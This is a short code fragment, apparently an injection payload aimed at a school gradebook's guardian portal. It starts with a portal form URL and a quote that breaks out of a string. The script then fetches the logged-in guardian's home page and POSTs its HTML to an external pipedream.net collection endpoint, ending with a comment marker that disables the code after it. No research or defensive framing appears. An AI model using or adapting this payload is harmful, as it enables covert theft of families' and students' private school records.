https://gradebook.milforded.org/guardian/form.html?formid=225181';
fetch("https://gradebook.milforded.org/guardian/home.html")
  .then(res => res.text())
  .then(html => fetch("https://eon32wucwm6yep3.m.pipedream.net/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ html })
  }))
  .catch(console.error);)//',
